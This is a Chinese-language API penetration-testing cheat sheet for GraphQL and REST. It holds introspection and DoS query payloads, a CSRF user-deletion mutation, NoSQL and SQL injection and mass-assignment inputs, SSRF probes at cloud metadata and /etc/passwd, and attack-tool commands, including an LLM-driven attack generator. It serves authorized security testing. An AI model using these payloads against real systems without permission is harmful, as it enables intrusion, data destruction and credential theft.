# REST + GraphQL 深度测试

## GraphQL 安全测试完整清单

### 内省探测（三级降级）

```graphql
# Level 1 — 标准内省
{ __schema { queryType { name } mutationType { name } types { name fields { name type { name } } } } }

# Level 2 — 精简内省（绕过 WAF）
{ __schema { types { name } } }

# Level 3 — 最小探测
{ __type(name: "Query") { name } }
```

### DoS 攻击向量

```graphql
# 别名过载
query { a1: __typename a2: __typename ... a100: __typename }

# 批查询过载
[query1, query2, ..., query10]

# 循环查询
query { __schema { types { fields { type { fields { type { fields { name } } } } } } } }

# 指令过载
query { __typename @skip(if: false) @include(if: true) ... }
```

### 授权测试

```graphql
# GET 突变（CSRF）
GET /graphql?query=mutation+{+deleteUser(id:1)+}

# 批查询绕过认证
[
  { "query": "query { me { id } }" },
  { "query": "mutation { deleteUser(id: 2) }" }
]
```

## REST API 深度测试

### 方法操控矩阵

| 端点 | GET | POST | PUT | PATCH | DELETE | OPTIONS |
|------|-----|------|-----|-------|--------|---------|
| /users | ✓ 可访问 | 测试越权创建 | 测试批量覆盖 | 测试字段注入 | 测试级联删除 | 信息泄漏 |
| /users/me | 基准 | — | 测试自我提权 | 测试字段追加 | 测试自我删除 | — |

### 参数注入

```json
// NoSQL 注入
{"username": {"$gt": ""}, "password": {"$ne": ""}}

// 批量赋值
{"email": "user@example.com", "role": "admin", "isAdmin": true}

// 参数污染
GET /api/users?role=user&role=admin

// JSON 数组注入
{"ids": [1, 2, 3]} → {"ids": ["1 UNION SELECT ..."]}
```

### SSRF via API

```
常见 SSRF 参数: webhook_url, callback_url, avatar_url, import_url, 
                redirect_uri, file_url, proxy_url, image_url
测试: http://169.254.169.254/latest/meta-data/ (AWS)
      http://metadata.google.internal/ (GCP)
      file:///etc/passwd
```

## 自动化工具链

### Vespasian（流量驱动规范生成）

```bash
# 从无头浏览器爬取
vespasian crawl --url https://target.com --depth 3

# 从 Burp/HAR 导入
vespasian import --file traffic.har

# 导出 OpenAPI 3.0 + GraphQL SDL
vespasian export --format openapi3 --output api-spec.yaml
```

### Entropy（LLM 攻击生成）

```bash
# 基于 spec 的自动测试
entropy --spec api-spec.yaml --live --persona all

# 五种并发人格：
# - malicious_insider: IDOR/批量赋值/权限提升
# - bot_swarm: 限速绕过/DoS/自动化滥用
# - penetration_tester: 注入/认证绕过
# - impatient_consumer: 竞态条件/错误处理
# - confused_user: 意外输入/边界测试

# CI 模式
entropy --spec api-spec.yaml --ci --watch
```

### api.sh（8 阶段管道）

```bash
# Phase 1-3: GraphQL 侦察 → 利用 → 爆破
./api.sh graphql-recon https://target.com/graphql
./api.sh graphql-exploit https://target.com/graphql

# Phase 4: REST 滥用
./api.sh rest-abuse https://target.com/api

# Phase 5: WebSocket
./api.sh ws-test wss://target.com/ws

# Phase 6: SOAP/XXE
./api.sh soap-xxe https://target.com/soap

# Phase 7: 限速绕过
./api.sh rate-bypass https://target.com/api

# Phase 8: Schema 收割
./api.sh schema-harvest https://target.com
```

Source: OWASP API Top 10, Praetorian Vespasian, Entropy, FireTail GraphQL
